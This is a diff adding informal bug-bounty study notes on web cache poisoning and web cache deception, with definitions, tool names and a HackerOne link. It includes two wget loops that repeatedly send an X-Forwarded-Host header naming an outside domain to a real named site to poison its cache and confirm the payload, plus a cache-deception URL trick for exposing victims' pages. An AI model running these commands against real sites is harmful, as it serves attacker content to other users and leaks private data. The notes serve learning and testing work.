@@ -33,7 +33,43 @@ a web cache is a technique that stores a copy of a given resource and serve it b
 if i am surfing a web page and another coustmer want the same page is show the same content to the another person
 if we change the requests it will affect the another person also 
 
+Inputs that aren’t part of the cache key are called unkeyed inputs. Inputs that affect the response are called used inputs. 
+
 x-forwarded-host: xss payload
+
+$ while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379" --header 'X-Forwarded-Host: cyberjutsu.io/#' -qO->/dev/null; echo "poisoning...";done
+
+In the 2nd terminal, run command below for confirmation this attack is successful:
+
+while true; do wget "https://help.nextcloud.com/?qwKzzSR=649227948379" -qO-|grep "cyberjutsu.io"; echo "ping my payload..." ;done
+
+this type of one liner can use to find web cache poisoining
+
+https://hackerone.com/reports/429747 -- good report 
+
+Tools -- param miner burp suite
+
+
+
+
+
+
+ ------------------ Web cache Deception  ----------------------
+The goal of Cache Deception is to make clients load resources that are going to be saved by the cache with their sensitive information.
+
+When accessing a URL like http://www.example.com/home.php/non-existent.css
+A GET request to that URL will be produced by the browser. The server returns the content of http://www.example.com/home.php. And yes, the URL remains http://www.example.com/home.php/non-existent.css. The HTTP headers will be the same as for accessing http://www.example.com/home.php directly: same caching headers and same content type (text/html, in this case).
+The web cache servre saves the returned page in the server's cache. Then the attacker can go to the url: http://www.example.com/home.php/non-existent.css and the page of the victim will be presented with the victim's sensitive information (The page content).
+
+Tool -- https://github.com/arbazkiraak/web-cache-deception-checker
+
+
+
+
+
+
+
+
 
 
  
